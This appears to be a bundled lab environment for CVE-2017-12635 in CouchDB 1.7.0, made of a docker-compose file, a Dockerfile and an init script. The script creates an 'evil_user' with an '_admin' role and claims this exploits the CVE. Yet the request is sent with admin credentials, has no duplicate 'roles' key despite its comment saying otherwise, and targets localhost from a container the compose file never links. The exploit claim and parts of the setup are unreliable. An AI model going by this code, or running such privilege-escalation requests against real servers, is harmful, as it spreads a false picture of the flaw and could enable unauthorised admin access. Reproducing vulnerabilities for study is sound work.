{
    "files": [
        {
            "location": "./../../dockers/CVE-2017-12635/custom_no_tool/docker-compose.yml",
            "content": "services:\n  couchdb:\n    image: couchdb:1.7.0\n    container_name: couchdb_vulnerable\n    ports:\n      - \"5984:5984\"\n    environment:\n      - COUCHDB_USER=admin\n      - COUCHDB_PASSWORD=password\n    volumes:\n      - couchdb_data:/opt/couchdb/data\n\nvolumes:\n  couchdb_data:\n"
        },
        {
            "location": "./../../dockers/CVE-2017-12635/custom_no_tool/init-couchdb.sh",
            "content": "#!/bin/bash\n\n# Wait for CouchDB to start\nuntil curl -s http://admin:password@localhost:5984/_up; do\n  echo \"Waiting for CouchDB to start...\"\n  sleep 1\ndone\n\n# Create a test database\ncurl -X PUT http://admin:password@localhost:5984/testdb\n\n# Add a test document\ncurl -X POST http://admin:password@localhost:5984/testdb \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\": \"test\", \"type\": \"example\"}'\n\n# Create a user with duplicate roles\ncurl -X PUT http://admin:password@localhost:5984/_users/org.couchdb.user:evil_user \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\": \"evil_user\", \"password\": \"password\", \"roles\": [\"user\", \"_admin\"], \"type\": \"user\"}'\n\n# Note: The above user creation exploits the CVE-2017-12635 vulnerability.\n"
        },
        {
            "location": "./../../dockers/CVE-2017-12635/custom_no_tool/Dockerfile",
            "content": "FROM ubuntu:16.04\n\nRUN apt-get update && \\\n    apt-get install -y curl && \\\n    apt-get clean\n\nCOPY init-couchdb.sh /init-couchdb.sh\nRUN chmod +x /init-couchdb.sh\n\nCMD [\"/init-couchdb.sh\"]\n"
        }
    ],
    "directory_tree": "CVE-2017-12635/\n\u2514\u2500\u2500 custom_no_tool/\n    \u251c\u2500\u2500 Dockerfile\n    \u251c\u2500\u2500 docker-compose.yml\n    \u2514\u2500\u2500 init-couchdb.sh\n"
}